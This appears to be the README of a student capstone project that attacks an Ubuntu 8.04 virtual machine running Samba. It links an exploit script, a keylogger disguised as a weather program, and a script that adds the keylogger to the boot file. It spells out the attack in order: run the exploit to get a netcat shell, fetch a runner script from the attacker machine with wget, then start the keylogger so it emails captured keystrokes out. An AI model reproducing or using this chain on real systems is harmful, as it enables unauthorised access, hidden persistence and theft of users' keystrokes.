# Capstone

## Scripts
- [exploit script](exploit/exploit.sh)
- [run keylogger](exploit/run.sh)
- [add keylogger to boot file](exploit/rewriteBoot.sh)
- [keylogger](exploit/weather.py)
## Binary
[A seemingly checking weather keylogger binary](exploit/weather)
## Email
A temporary Email address is needed so that keylogger can send message back
## Virtual Machines

### Attacker

- Linux based machine with python on it (Kali-Linux is recommended)
- Unix based machine

### Victim

- [Ubuntu 8.04 Desktop with samba installed](https://drive.google.com/file/d/1bCviB84Nn4B2H-JRrIk0tRF7tXcdrCtE/view?usp=sharing)

## How To Run

In the Kali-Linux, copy all the bash script files and binary file into the same folder

```bash
> ls # should see only 4 files
exploit.sh rewriteBoot.sh  run.sh weather
```

Start attack by:

```bash
chmod +x exploit.sh # give permission
./exploit.sh <Target IP> <Kali-Linux IP> # run exploit script
```

Give it seconds, if nothing showing after typing the command, give it another try.

Inside the netcat shell:

```bash
wget http://<Kali-Linux IP>:8564/run.sh
chmod +x run.sh
./run.sh <Kali-Linux IP> <Email Address> <Server IP>
```

